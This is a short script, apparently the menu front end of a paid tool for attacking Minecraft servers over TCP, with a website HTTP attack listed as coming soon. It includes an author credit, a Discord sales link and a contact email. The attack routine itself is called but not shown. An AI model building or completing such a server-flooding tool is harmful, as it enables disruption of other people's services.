craft show_intro
    yell "=============================================================="
    yell ""
    yell "         [1] - Author: IdlerHa"
    yell "         [2] - Discord: @banhmius"
    yell "         [3] - Buy tool: https://discord.gg/un6bs3aCrF"
    yell "         [4] - Contact: minhchienmmo@outlook.com"
    yell ""
    yell "=============================================================="
    yell ""
    hold _ = input("Press any key to return...")
end

# ===== Menu chính =====
craft menu
    hold running = true
    spin while running
        yell "============================================================"
        yell "         [1] - Attack Minecraft Server (TCP)"
        yell "         [2] - Attack Website Server (HTTP) [Coming Soon]"
        yell "         [3] - Introduction"
        yell "         [4] - Exit"
        yell "============================================================"
        yell ""
        hold choice = input("Your choice: ")
        check choice == "1"
            attack_minecraft()
        end
        check choice == "2"
            yell "=============================================================="
            yell ""
            yell "           This feature is not yet completed."
            yell ""
            yell "=============================================================="
            yell ""
            hold _ = input("Press any key to return...")
        end
        check choice == "3"
            show_intro()
        end
        check choice == "4"
            yell "Thank you for using my program!"
            set running = false
        end
        check choice == ""
            yell ""
        end
    end
end

logo()
menu()
exit(0)
